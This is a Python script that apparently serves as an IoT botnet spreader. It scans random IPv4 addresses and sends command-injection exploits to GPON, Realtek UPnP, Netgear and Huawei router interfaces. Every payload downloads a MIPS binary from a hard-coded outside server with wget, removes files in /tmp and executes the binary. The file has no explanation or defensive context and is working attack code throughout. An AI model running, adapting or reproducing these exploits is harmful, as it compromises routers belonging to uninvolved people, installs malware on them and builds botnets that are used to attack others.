import socket
import time
import os
import threading
import random

def socket_connect_tcp(host, port): 
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        return sock
    except socket.error:
        return None

def exploit_socket_gpon8080(host):
    pid = os.fork()
    if pid > 0:
        return

    gpon_request1 = ("POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
                     "Host: 127.0.0.1:8080\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Accept: */*\r\n"
                     "User-Agent: r00ts3c-owned-you\r\n"
                     "Content-Length: 118\r\n\r\n"
                     "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;"
                     "wget+http://91.92.252.211/qqyt33.mips+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0")

    gpon_socket1 = socket_connect_tcp(host, 8080)
    if gpon_socket1:
        gpon_socket1.sendall(gpon_request1.encode())
        time.sleep(0.1)
        gpon_socket1.close()
        print(f"[gpon_8080] exploitable {host}")
    os._exit(0)

def exploit_socket_gpon80(host):
    pid = os.fork()
    if pid > 0:
        return

    gpon_request2 = ("POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
                     "Host: 127.0.0.1:80\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Accept: */*\r\n"
                     "User-Agent: r00ts3c-owned-you\r\n"
                     "Content-Length: 118\r\n\r\n"
                     "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;"
                     "wget+http://91.92.252.211/qqyt33.mips+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0")

    gpon_socket2 = socket_connect_tcp(host, 80)
    if gpon_socket2:
        gpon_socket2.sendall(gpon_request2.encode())
        time.sleep(0.1)
        gpon_socket2.close()
        print(f"[gpon_80] exploitable {host}")
    os._exit(0)

def exploit_socket_realtek(host):
    pid = os.fork()
    if pid > 0:
        return

    realtek_request = ("POST /picsdesc.xml HTTP/1.1\r\n"
                       f"Host: {host}:52869\r\n"
                       "Content-Length: 630\r\n"
                       "Accept-Encoding: gzip, deflate\r\n"
                       "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                       "Accept: */*\r\n"
                       "User-Agent: r00ts3c-owned-you\r\n"
                       "Connection: keep-alive\r\n\r\n"
                       "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                       "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping "
                       "xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost>"
                       "<NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382"
                       "</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf*; wget http://91.92.252.211/qqyt33.mips`"
                       "</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing"
                       "</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping>"
                       "</s:Body></s:Envelope>\r\n\r\n")
    realtek_request2 = ("POST /picsdesc.xml HTTP/1.1\r\n"
                        f"Host: {host}:52869\r\n"
                        "Content-Length: 630\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                        "Accept: */*\r\n"
                        "User-Agent: r00ts3c-owned-you\r\n"
                        "Connection: keep-alive\r\n\r\n"
                        "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping "
                        "xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost>"
                        "<NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382"
                        "</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x qqyt33.mips;./qqyt33.mips realtek`"
                        "</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing"
                        "</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping>"
                        "</s:Body></s:Envelope>\r\n\r\n")

    realtek_socket = socket_connect_tcp(host, 52869)
    if realtek_socket:
        realtek_socket.sendall(realtek_request.encode())
        time.sleep(5)
        realtek_socket.sendall(realtek_request2.encode())
        time.sleep(0.1)
        realtek_socket.close()
        print(f"[realtek] exploitable {host}")
    os._exit(0)

def exploit_socket_netgear(host):
    pid = os.fork()
    if pid > 0:
        return

    netgear_request = ("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;"
                       "wget+http://91.92.252.211/qqyt33.mips+-O+/tmp/netgear;sh+netgear&curpath=/&"
                       "currentsetting.htm=1 HTTP/1.0\r\n\r\n")

    netgear_socket = socket_connect_tcp(host, 8080)
    netgear_socket2 = socket_connect_tcp(host, 80)
    if netgear_socket:
        netgear_socket.sendall(netgear_request.encode())
        time.sleep(0.1)
        netgear_socket.close()
        print(f"[netgear_8080] exploitable {host}")
    if netgear_socket2:
        netgear_socket2.sendall(netgear_request.encode())
        time.sleep(0.1)
        netgear_socket2.close()
        print(f"[netgear_80] exploitable {host}")
    os._exit(0)

def exploit_socket_huawei(host):
    pid = os.fork()
    if pid > 0:
        return

    huawei_request = ("POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
                      f"Host: {host}:37215\r\n"
                      "Content-Length: 601\r\n"
                      "Connection: keep-alive\r\n"
                      "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", "
                      "nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", "
                      "response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", "
                      "nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n"
                      "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                      "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade "
                      "xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>`cd /tmp/;"
                      "rm -rf *;wget http://91.92.252.211/qqyt33.mips;chmod 777 qqyt33.mips;./qqyt33.mips huawei`"
                      "</NewStatusURL><NewDownloadURL></NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n")

    huawei_socket = socket_connect_tcp(host, 37215)
    if huawei_socket:
        huawei_socket.sendall(huawei_request.encode())
        time.sleep(0.1)
        huawei_socket.close()
        print(f"[huawei] exploitable {host}")
    os._exit(0)

def random_ip_generation():
    ip1 = random.randint(0, 255)
    ip2 = random.randint(0, 255)
    ip3 = random.randint(0, 255)
    ip4 = random.randint(0, 255)
    return f"{ip1}.{ip2}.{ip3}.{ip4}"

def exploit(host):
    exploit_socket_gpon8080(host)
    exploit_socket_gpon80(host)
    exploit_socket_realtek(host)
    exploit_socket_netgear(host)
    exploit_socket_huawei(host)

MAX_THREADS = 15
thread_lock = threading.Lock()

def main():
    while True:
        threads = []
        with thread_lock:
            existing_threads = threading.active_count()
            if existing_threads < MAX_THREADS:
                for _ in range(MAX_THREADS - existing_threads):
                    host = random_ip_generation()
                    t = threading.Thread(target=exploit, args=(host,))
                    t.start()
                    threads.append(t)
        
        for thread in threads:
            thread.join()

        time.sleep(0.1)

if __name__ == "__main__":
    main()
